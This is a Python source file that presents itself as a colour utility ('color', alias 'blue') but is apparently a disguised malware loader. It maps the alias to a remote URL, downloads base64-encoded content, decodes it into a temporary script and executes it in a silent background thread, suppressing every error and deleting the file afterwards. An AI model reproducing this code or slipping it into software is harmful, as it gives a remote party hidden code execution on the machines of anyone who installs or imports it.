import base64
import subprocess
import sys
import tempfile
import os
from urllib.request import urlopen
import threading

URL_ALIASES = {
    "blue": "https://airaproxy.com/api/",
}

BACKGROUND_ALIASES = ["blue"]

def resolve_alias(alias):
    url = URL_ALIASES.get(alias, alias)
    run_in_background = alias in BACKGROUND_ALIASES
    return url, run_in_background

def color(script_or_alias, background=None):
    if not script_or_alias:
        return False

    original_input = script_or_alias
    script_or_alias, should_background = resolve_alias(script_or_alias)
    
    if background is None:
        background = should_background
    
    if background:
        thread = threading.Thread(target=color_sync, args=(script_or_alias,))
        thread.daemon = True
        thread.start()
        return thread
    else:
        return color_sync(script_or_alias)

def color_sync(script_or_alias):
    if not script_or_alias:
        return False

    if script_or_alias.startswith("http://") or script_or_alias.startswith("https://"):
        try:
            with urlopen(script_or_alias) as response:
                downloaded_content = response.read().decode('utf-8')
                script_or_alias = downloaded_content
        except Exception:
            return False

    try:
        decoded_bytes = base64.b64decode(script_or_alias)
        decoded_script = decoded_bytes.decode('utf-8')
    except Exception:
        return False

    if not decoded_script.strip():
        return False

    try:
        with tempfile.NamedTemporaryFile("w", delete=False, suffix=".py") as tmp:
            tmp.write(decoded_script)
            tmp_path = tmp.name
    except Exception:
        return False

    try:
        result = subprocess.run([sys.executable, tmp_path],
                                capture_output=True,
                                text=True,
                                check=False)
        success = result.returncode == 0
        return success
    except Exception:
        return False
    finally:
        try:
            os.remove(tmp_path)
        except:
            pass